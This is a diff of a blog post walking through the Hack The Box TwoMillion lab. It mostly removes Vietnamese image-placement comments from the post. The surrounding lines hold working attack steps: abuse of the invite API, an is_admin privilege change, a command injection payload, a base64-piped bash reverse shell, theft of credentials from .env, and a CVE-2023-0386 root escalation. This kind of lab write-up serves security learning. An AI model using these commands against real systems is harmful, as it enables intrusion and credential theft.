@@ -3,71 +3,16 @@ title: "HTB TwoMillion Walkthrough"
 author: sh1nn
 date: 2026-02-21
 tags:
+  - ctf-writeup
   - hackthebox
-  - twomillion
-  - ctf
-  - web-security
-  - api-security
+  - broken-authorization
   - command-injection
-  - linux
   - privilege-escalation
 description: "A technical walkthrough of Hack The Box TwoMillion, covering invite-code generation, authenticated API enumeration, broken authorization, command injection, credential reuse, and CVE-2023-0386."
 cover: images/twomillion/2million.png
 draft: false
 toc: true
 ---
-
-<!--
-HƯỚNG DẪN ẢNH TRƯỚC KHI ĐĂNG BLOG
-
-1. Nên đặt toàn bộ ảnh của bài trong:
-   public/images/twomillion/
-
-2. Nên đổi tên ảnh ngắn, không dấu, không khoảng trắng:
-   01-nmap-scan.png
-   02-invite-page.png
-   03-invite-script-source.png
-   ...
-
-3. Mẫu chèn ảnh Markdown chuẩn:
-   ![Mô tả ảnh](/images/twomillion/01-nmap-scan.png)
-
-4. Mẫu chèn ảnh có giới hạn chiều rộng bằng HTML:
-   <img src="/images/twomillion/04-deobfuscated-javascript.png"
-        alt="Deobfuscated invite JavaScript"
-        width="760">
-
-5. Mẫu chèn ảnh có chú thích:
-   <figure>
-     <img src="/images/twomillion/16-root-shell.png"
-          alt="Root shell after exploiting CVE-2023-0386">
-     <figcaption>Root access confirmed with the id command.</figcaption>
-   </figure>
-
-6. Nếu framework của bạn không dùng thư mục public/, hãy sửa phần đường dẫn ảnh
-   cho phù hợp với Hugo page bundle, Astro assets hoặc cấu trúc dự án hiện tại.
-
-GỢI Ý ĐỔI TÊN ẢNH CŨ
-
-Screenshot 2026-07-14 at 14.03.34.png -> 01-nmap-scan.png
-Screenshot 2026-07-14 at 14.38.25.png -> 02-invite-page.png
-Screenshot 2026-07-14 at 14.40.05.png -> 03-invite-script-source.png
-Screenshot 2026-07-14 at 14.41.17.png -> 04-deobfuscated-javascript.png
-Screenshot 2026-07-14 at 14.54.20.png -> 05-invite-instructions.png
-Screenshot 2026-07-14 at 14.58.55.png -> 06-generated-invite-code.png
-Screenshot 2026-07-14 at 15.08.21.png -> 07-registration.png
-Screenshot 2026-07-14 at 15.16.20.png -> 08-session-cookie.png
-Screenshot 2026-07-14 at 15.22.41.png -> 09-api-routes.png
-Screenshot 2026-07-14 at 15.35.01.png -> 10-admin-escalation.png
-Screenshot 2026-07-14 at 15.41.26.png -> 11-command-injection.png
-Screenshot 2026-07-14 at 15.51.43.png -> 12-reverse-shell.png
-Screenshot 2026-07-14 at 15.53.50.png -> 13-env-credentials.png
-Screenshot 2026-07-14 at 16.02.23.png -> 14-ssh-admin.png
-Screenshot 2026-07-14 at 16.44.29.png -> 15-local-mail.png
-Screenshot 2026-07-14 at 16.46.23.png -> 16-kernel-version.png
-Screenshot 2026-07-14 at 16.48.44.png -> 17-os-release.png
-Ảnh root shell mới -> 18-root-shell.png
--->
 
 # Hack The Box: TwoMillion Writeup
 
@@ -130,13 +75,6 @@ nmap -sC -sV -Pn 10.129.5.245
 
 The scan identifies SSH on port 22 and HTTP on port 80. The web server redirects requests to `2million.htb`.
 
-<!--
-ẢNH CẦN CHÈN:
-- Nội dung: Kết quả Nmap thể hiện port 22, port 80 và redirect tới 2million.htb.
-- Tên file gợi ý: 01-nmap-scan.png
-- Định dạng đang dùng: Markdown chuẩn.
--->
-
 ![Nmap service and version scan](/images/twomillion/01-nmap-scan.png)
 
 Add the virtual host to `/etc/hosts`:
@@ -148,12 +86,6 @@ echo '10.129.5.245 2million.htb' | sudo tee -a /etc/hosts
 ### 1.2 Web application review
 
 Opening `http://2million.htb` reveals an older version of the Hack The Box platform. The site provides login and registration functionality, but registration requires an invite code.
-
-<!--
-ẢNH CẦN CHÈN:
-- Nội dung: Trang invite hoặc giao diện cũ của Hack The Box.
-- Tên file gợi ý: 02-invite-page.png
--->
 
 ![TwoMillion invite page](/images/twomillion/02-invite-page.png)
 
@@ -172,12 +104,6 @@ The invite page loads an obfuscated JavaScript file:
 ```html
 <script defer src="/js/inviteapi.min.js"></script>
 ```
-
-<!--
-ẢNH CẦN CHÈN:
-- Nội dung: DevTools hoặc page source thể hiện inviteapi.min.js.
-- Tên file gợi ý: 03-invite-script-source.png
--->
 
 ![Invite page source loading inviteapi.min.js](/images/twomillion/03-invite-script-source.png)
 
@@ -235,12 +161,6 @@ curl -sX POST \
   http://2million.htb/api/v1/invite/how/to/generate | jq
 ```
 
-<!--
-ẢNH CẦN CHÈN:
-- Nội dung: JSON trả về, gồm trường data và enctype ROT13.
-- Tên file gợi ý: 05-invite-instructions.png
--->
-
 ![Invite-generation instructions returned by the API](/images/twomillion/how-to-generate.png)
 
 The response contains a ROT13-encoded message. It can be decoded locally:
@@ -278,21 +198,9 @@ curl -sX POST \
   | base64 -d
 ```
 
-<!--
-ẢNH CẦN CHÈN:
-- Nội dung: Kết quả API trả về code Base64 và kết quả sau khi decode.
-- Tên file gợi ý: 06-generated-invite-code.png
--->
-
 ![Generated and decoded invite code](/images/twomillion/decode-base64.png)
 
 Submit the decoded value on `/invite`, then register a normal user account.
-
-<!--
-ẢNH CẦN CHÈN:
-- Nội dung: Form đăng ký sau khi invite code được chấp nhận.
-- Tên file gợi ý: 07-registration.png
--->
 
 ![TwoMillion account registration](/images/twomillion/07-registration.png)
 
@@ -301,13 +209,6 @@ Submit the decoded value on `/invite`, then register a normal user account.
 ### 3.1 Capturing the session cookie
 
 After logging in, the application creates a PHP session cookie named `PHPSESSID`. Capture it with Burp Suite or the browser developer tools.
-
-<!--
-ẢNH CẦN CHÈN:
-- Nội dung: Request có Cookie: PHPSESSID=...
-- Che hoặc thay session thật bằng giá trị giả nếu bài được đăng công khai.
-- Tên file gợi ý: 08-session-cookie.png
--->
 
 ![PHP session cookie captured in Burp Suite](/images/twomillion/08-session-cookie.png)
 
@@ -330,12 +231,6 @@ curl -s \
   http://2million.htb/api/v1 \
   --cookie 'PHPSESSID=<SESSION_ID>' | jq
 ```
-
-<!--
-ẢNH CẦN CHÈN:
-- Nội dung: Danh sách route user và admin.
-- Tên file gợi ý: 09-api-routes.png
--->
 
 ![API v1 route listing](/images/twomillion/09-api-routes.png)
 
@@ -412,13 +307,6 @@ curl -sX PUT \
   -d '{"email":"<YOUR_EMAIL>","is_admin":1}' | jq
 ```
 
-<!--
-ẢNH CẦN CHÈN:
-- Nội dung: Request update role và JSON trả về is_admin: 1.
-- Có thể gộp ảnh update role và ảnh admin/auth trả về true thành một ảnh.
-- Tên file gợi ý: 10-admin-escalation.png
--->
-
 ![Normal account promoted to administrator](/images/twomillion/10-admin-escalation.png)
 
 Verify the new role:
@@ -467,12 +355,6 @@ curl -sX POST \
   -d '{"username":"test;id;"}'
 ```
 
-<!--
-ẢNH CẦN CHÈN:
-- Nội dung: Response có uid=33(www-data).
-- Tên file gợi ý: 11-command-injection.png
--->
-
 ![Command injection confirmed with the id command](/images/twomillion/11-command-injection.png)
 
 The response includes:
@@ -506,12 +388,6 @@ curl -s -X POST http://2million.htb/api/v1/admin/vpn/generate \
 --data '{"username":"test;echo <BASE64_PAYLOAD> | base64 -d | bash;"}'
 ```
 
-<!--
-ẢNH CẦN CHÈN:
-- Nội dung: Terminal listener nhận được shell và lệnh id xác nhận www-data.
-- Tên file gợi ý: 12-reverse-shell.png
--->
-
 ![Reverse shell received as www-data](/images/twomillion/12-reverse-shell.png)
 
 The listener receives a shell as `www-data`.
@@ -527,12 +403,6 @@ cd /var/www/html
 ls -la
 cat .env
 ```
-
-<!--
-ẢNH CẦN CHÈN:
-- Nội dung: File .env và các biến DB_USERNAME, DB_PASSWORD.
-- Tên file gợi ý: 13-env-credentials.png
--->
 
 ![Application environment file containing database credentials](/images/twomillion/13-env-credentials.png)
 
@@ -572,13 +442,6 @@ id
 cat ~/user.txt
 ```
 
-<!--
-ẢNH CẦN CHÈN:
-- Nội dung: SSH thành công, id của admin và vị trí user flag.
-- Không cần hiển thị nguyên flag.
-- Tên file gợi ý: 14-ssh-admin.png
--->
-
 ![SSH access as the admin user](/images/twomillion/14-ssh-admin.png)
 
 The credential recovered from `.env` is also accepted by the local `admin` account, which provides the path from the web shell to SSH access.
@@ -593,12 +456,6 @@ Inspect the local mailbox:
 cat /var/mail/admin
 ```
 
-<!--
-ẢNH CẦN CHÈN:
-- Nội dung: Email nhắc tới OverlayFS, FUSE và kernel exploits.
-- Tên file gợi ý: 15-local-mail.png
--->
-
 ![Local mail hinting at an OverlayFS and FUSE vulnerability](/images/twomillion/15-local-mail.png)
 
 The message warns about recent Linux kernel vulnerabilities and specifically references OverlayFS and FUSE. This is a strong hint toward **CVE-2023-0386**.
@@ -611,12 +468,6 @@ Enumerate the running kernel:
 uname -a
 ```
 
-<!--
-ẢNH CẦN CHÈN:
-- Nội dung: uname -a với kernel 5.15.70-051570-generic.
-- Tên file gợi ý: 16-kernel-version.png
--->
-
 ![Linux kernel version enumeration](/images/twomillion/16-kernel-version.png)
 
 Check the distribution release:
@@ -624,12 +475,6 @@ Check the distribution release:
 ```bash
 lsb_release -a
 ```
-
-<!--
-ẢNH CẦN CHÈN:
-- Nội dung: Ubuntu 22.04.2 LTS, codename jammy.
-- Tên file gợi ý: 17-os-release.png
--->
 
 ![Ubuntu Jammy release information](/images/twomillion/17-os-release.png)
 
@@ -700,14 +545,6 @@ Read the root flag:
 ```bash
 cat /root/root.txt
 ```
-
-<!--
-ẢNH BẮT BUỘC CẦN BỔ SUNG:
-- Nội dung: ./exp chạy thành công và id trả về uid=0(root).
-- Không hiển thị nguyên root flag.
-- Tên file gợi ý: 18-root-shell.png
-- Định dạng đang dùng: figure + figcaption để minh họa kiểu chèn ảnh có chú thích.
--->
 
 ![Root shell obtained after exploiting CVE-2023-0386](/images/twomillion/18-root-shell.png)
 
